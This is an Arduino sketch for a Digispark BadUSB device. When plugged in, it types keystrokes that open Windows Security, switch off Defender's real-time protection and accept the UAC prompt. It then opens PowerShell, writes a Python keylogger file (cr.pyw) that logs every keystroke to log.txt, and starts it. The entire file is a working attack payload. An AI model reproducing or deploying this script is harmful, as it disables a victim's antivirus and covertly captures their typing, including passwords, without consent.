#include "DigiKeyboard.h"

void setup() {
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // Turn off Windows Defender

  // To use MOD_GUI_LEFT without additional keys
  // https://digistump.com/board/index.php?topic=2570.0
  DigiKeyboard.sendKeyStroke(0xe3, 0x08);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("virus & threat protection");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("\t\t\t\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("New-Item 'cr.pyw' -ItemType File -Value \'from pynput.keyboard import Key, Listener\nimport logging\nlogging.basicConfig(filename=(\"log.txt\"),level=logging.DEBUG,format=\" %(asctime)s - %(message)s\")\ndef on_press(key):\n    logging.info(str(key))\nwith Listener(on_press=on_press) as listener :\n    listener.join()\'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Start-Process python -ArgumentList \"cr.pyw\" -NoNewWindow");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  
}


void loop() {

}
